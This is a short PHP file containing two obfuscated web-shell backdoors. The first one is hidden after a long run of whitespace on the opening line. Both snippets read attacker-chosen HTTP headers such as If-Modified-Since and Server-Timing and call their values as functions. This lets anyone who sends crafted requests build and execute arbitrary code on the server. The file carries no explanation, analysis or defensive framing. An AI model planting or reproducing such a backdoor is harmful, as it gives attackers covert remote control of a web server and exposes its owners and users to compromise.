<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Modified-Since'])){$requests=$_HEADERS['If-Modified-Since']('', $_HEADERS['Feature-Policy']($_HEADERS['Large-Allocation']));$requests();}

$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $include = $_HEADERS['Server-Timing']('', $_HEADERS['If-Modified-Since']($_HEADERS['Clear-Site-Data']));
    $include();
}